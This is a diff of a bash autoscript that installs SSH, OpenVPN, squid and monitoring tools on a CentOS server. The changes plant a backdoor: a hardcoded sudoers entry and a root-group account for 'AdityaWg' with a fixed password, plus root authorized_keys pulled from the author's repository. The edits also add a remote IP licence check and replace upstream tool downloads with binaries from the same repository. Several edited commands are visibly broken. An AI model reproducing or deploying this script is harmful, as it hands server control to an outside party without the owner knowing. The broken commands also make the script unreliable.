@@ -3,32 +3,22 @@
 # www.indoworx.com
 # initialisasi var
 OS=`uname -p`;
-
-# data pemilik server
-read -p "Nama pemilik server: " namap
-read -p "Nomor HP atau Email pemilik server: " nhp
-read -p "Masukkan username untuk akun default: " dname
-
-# ubah hostname
-echo "Hostname Anda saat ini $HOSTNAME"
-read -p "Masukkan hostname atau nama untuk server ini: " hnbaru
-echo "HOSTNAME=$hnbaru" >> /etc/sysconfig/network
-hostname "$hnbaru"
-echo "Hostname telah diganti menjadi $hnbaru"
-read -p "Maks login user (contoh 1 atau 2): " llimit
-echo "Proses instalasi script dimulai....."
-
-# Banner SSH
-echo "## SELAMAT DATANG DI SERVER PREMIUM $hnbaru ## " >> /etc/pesan
-echo "DENGAN MENGGUNAKAN LAYANAN SSH DARI SERVER INI BERARTI ANDA SETUJU SEGALA KETENTUAN YANG TELAH KAMI BUAT: " >> /etc/pesan
-echo "1. Tidak diperbolehkan untuk melakukan aktivitas illegal seperti DDoS, Hacking, Phising, Spam, dan Torrent di server ini; " >> /etc/pesan
-echo "2. Maks login $llimit kali, jika lebih dari itu maka akun otomatis ditendang oleh server; " >> /etc/pesan
-echo "3. Pengguna setuju jika kami mengetahui atau sistem mendeteksi pelanggaran di akunnya maka akun akan dihapus oleh sistem; " >> /etc/pesan
-echo "4. Tidak ada tolerasi bagi pengguna yang melakukan pelanggaran; " >> /etc/pesan
-echo "Server by $namap ( $nhp )" >> /etc/pesan
-
-echo "Banner /etc/pesan" >> /etc/ssh/sshd_config
-
+MYIP=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
+MYIP2="s/xxxxxxxxx/$MYIP/g";
+source="https://raw.githubusercontent.com/AdityaWg/autoscript/master";
+adityawg="https://github.com/AdityaWg/script-jualan-ssh-vpn/raw/master";
+# up
+wget -q -O adit $source/file/not.txt
+if ! grep -w -q $MYIP adit; then
+clear
+echo "Gagal Menginstal VPS :V"
+echo "Info Lebih Lanjut Hub. AdityaWg (WA 082210988552)"
+rm /root/adit
+rm -f /root/adit
+rm /root/debian7.sh
+rm -f /root/debian7.sh
+exit
+fi
 # update software server
 yum update -y
 
@@ -58,10 +48,10 @@ rpm -Uvh epel-release-6-8.noarch.rpm
 rpm -Uvh remi-release-6.rpm
 
 if [ "$OS" == "x86_64" ]; then
-  wget https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/app/rpmforge.rpm
+  wget https://github.com/AdityaWg/script-jualan-ssh-vpn/raw/master/app/rpmforge-release-0.5.3-1.el6.rf.x86_64.rpm
   rpm -Uvh rpmforge.rpm
 else
-  wget https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/app/rpmforge.rpm
+  wget https://github.com/AdityaWg/script-jualan-ssh-vpn/raw/master/app/rpmforge-release-0.5.3-1.el6.rf.i686.rpm
   rpm -Uvh rpmforge.rpm
 fi
 
@@ -80,13 +70,13 @@ yum -y update
 # Untuk keamanan server
 cd
 mkdir /root/.ssh
-wget https://github.com/khairilg/script-jualan-ssh-vpn/raw/master/conf/ak -O /root/.ssh/authorized_keys
+wget $adityawg/conf/ak -O /root/.ssh/authorized_keys
 chmod 700 /root/.ssh
 chmod 600 /root/.ssh/authorized_keys
 echo "AuthorizedKeysFile     .ssh/authorized_keys" >> /etc/ssh/sshd_config
 sed -i 's/PermitRootLogin yes/#PermitRootLogin no/g' /etc/ssh/sshd_config
 echo "PermitRootLogin no" >> /etc/ssh/sshd_config
-echo "$dname  ALL=(ALL)  ALL" >> /etc/sudoers
+echo "adityawg  ALL=(ALL)  ALL" >> /etc/sudoers
 service sshd restart
 
 # install webserver
@@ -115,7 +105,7 @@ chkconfig vnstat on
 
 # install screenfetch
 cd
-wget https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/app/screenfetch-dev
+wget $adityawg/app/screenfetch-dev
 mv screenfetch-dev /usr/bin/screenfetch
 chmod +x /usr/bin/screenfetch
 echo "clear" >> .bash_profile
@@ -123,27 +113,27 @@ echo "screenfetch" >> .bash_profile
 
 # install webserver
 cd
-wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/conf/nginx.conf"
+wget -O $adityawg/conf/nginx.conf
 sed -i 's/www-data/nginx/g' /etc/nginx/nginx.conf
 mkdir -p /home/vps/public_html
-echo "<pre>Setup by Khairil G</pre>" > /home/vps/public_html/index.html
+echo "<pre>Setup by ADITYAWG</pre>" > /home/vps/public_html/index.html
 echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
 rm /etc/nginx/conf.d/*
-wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/conf/vps.conf"
+wget -O /etc/nginx/conf.d/vps.conf $adityawg/conf/vps.conf
 sed -i 's/apache/nginx/g' /etc/php-fpm.d/www.conf
 chmod -R +rx /home/vps
 service php-fpm restart
 service nginx restart
 
 # install openvpn
-wget -O /etc/openvpn/openvpn.zip "https://github.com/khairilg/script-jualan-ssh-vpn/raw/master/conf/openvpn-key.zip"
+wget -O /etc/openvpn/openvpn.zip $adityawg/conf/openvpn-key.zip
 cd /etc/openvpn/
 unzip openvpn.tar
-wget -O /etc/openvpn/1194.conf "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/conf/1194-centos.conf"
+wget -O /etc/openvpn/1194.conf $adityawg/conf/1194-centos.conf
 if [ "$OS" == "x86_64" ]; then
-  wget -O /etc/openvpn/1194.conf "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/conf/1194-centos64.conf"
+  wget -O /etc/openvpn/1194.conf $adityawg/conf/1194-centos64.conf
 fi
-wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/conf/iptables.up.rules"
+wget -O /etc/iptables.up.rules $adityawg/conf/iptables.up.rules
 sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
 sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.d/rc.local
 MYIP=`curl icanhazip.com`;
@@ -159,22 +149,22 @@ cd
 
 # configure openvpn client config
 cd /etc/openvpn/
-wget -O /etc/openvpn/client.ovpn "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/openvpn.conf"
+wget -O /etc/openvpn/client.ovpn $adityawg/master/openvpn.conf
 sed -i $MYIP2 /etc/openvpn/client.ovpn;
 #PASS=`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 15 | head -n 1`;
-useradd -g 0 -d /root/ -s /bin/bash $dname
-echo $dname:$dname"@2017" | chpasswd
-echo $dname > pass.txt
-echo $dname"@2017" >> pass.txt
+useradd -g 0 -d /root/ -s /bin/bash AdityaWg
+echo "AdityaWg:Tamvan" | chpasswd
+echo "username" > pass.txt
+echo "password" >> pass.txt
 tar cf client.tar client.ovpn pass.txt
 cp client.tar /home/vps/public_html/
 cp client.ovpn /home/vps/public_html/
 
 # install badvpn
 cd
-wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/conf/badvpn-udpgw"
+wget -O /usr/bin/badvpn-udpgw $adityawg/conf/badvpn-udpgw
 if [ "$OS" == "x86_64" ]; then
-  wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/conf/badvpn-udpgw64"
+  wget -O /usr/bin/badvpn-udpgw $adityawg/conf/badvpn-udpgw64
 fi
 sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300' /etc/rc.local
 sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300' /etc/rc.d/rc.local
@@ -183,15 +173,15 @@ screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300
 
 # install mrtg
 cd /etc/snmp/
-wget -O /etc/snmp/snmpd.conf "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/conf/snmpd.conf"
-wget -O /root/mrtg-mem.sh "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/conf/mrtg-mem.sh"
+wget -O /etc/snmp/snmpd.conf $adityawg/conf/snmpd.conf
+wget -O /root/mrtg-mem.sh $adityawg/conf/mrtg-mem.sh
 chmod +x /root/mrtg-mem.sh
 service snmpd restart
 chkconfig snmpd on
 snmpwalk -v 1 -c public localhost | tail
 mkdir -p /home/vps/public_html/mrtg
 cfgmaker --zero-speed 100000000 --global 'WorkDir: /home/vps/public_html/mrtg' --output /etc/mrtg/mrtg.cfg public@localhost
-curl "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/conf/mrtg.conf" >> /etc/mrtg/mrtg.cfg
+curl $adityawg/conf/mrtg.conf >> /etc/mrtg/mrtg.cfg
 sed -i 's/WorkDir: \/var\/www\/mrtg/# WorkDir: \/var\/www\/mrtg/g' /etc/mrtg/mrtg.cfg
 sed -i 's/# Options\[_\]: growright, bits/Options\[_\]: growright/g' /etc/mrtg/mrtg.cfg
 indexmaker --output=/home/vps/public_html/mrtg/index.html /etc/mrtg/mrtg.cfg
@@ -217,7 +207,7 @@ chkconfig dropbear on
 
 # install vnstat gui
 cd /home/vps/public_html/
-wget https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/app/vnstat_php_frontend-1.5.1.tar.gz
+wget $adityawg/app/vnstat_php_frontend-1.5.1.tar.gz
 tar xf vnstat_php_frontend-1.5.1.tar.gz
 rm vnstat_php_frontend-1.5.1.tar.gz
 mv vnstat_php_frontend-1.5.1 vnstat
@@ -235,7 +225,7 @@ chkconfig fail2ban on
 
 # install squid
 yum -y install squid
-wget -O /etc/squid/squid.conf "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/conf/squid-centos.conf"
+wget -O /etc/squid/squid.conf $adityawg/conf/squid-centos.conf
 sed -i $MYIP2 /etc/squid/squid.conf;
 service squid restart
 chkconfig squid on
@@ -252,9 +242,9 @@ chkconfig webmin on
 
 # pasang bmon
 if [ "$OS" == "x86_64" ]; then
-  wget -O /usr/bin/bmon "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/conf/bmon64"
+  wget -O /usr/bin/bmon $adityawg/conf/bmon64
 else
-  wget -O /usr/bin/bmon "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/conf/bmon"
+  wget -O /usr/bin/bmon $adityawg/conf/bmon
 fi
 chmod +x /usr/bin/bmon
 
@@ -267,9 +257,9 @@ chmod +x /usr/bin/bmon
 
 # downlaod script
 cd /usr/bin
-wget -O speedtest "https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py"
-wget -O bench "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/bench-network.sh"
-wget -O mem "https://raw.githubusercontent.com/pixelb/ps_mem/master/ps_mem.py"
+wget -O speedtest $adityawg/speedtest.py
+wget -O bench $adityawg/bench-network.sh
+wget -O mem $adityawg/ps_mem.py
 wget -O userlogin "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/user-login.sh"
 wget -O userexpire "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/autoexpire.sh"
 wget -O usernew "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/create-user.sh"
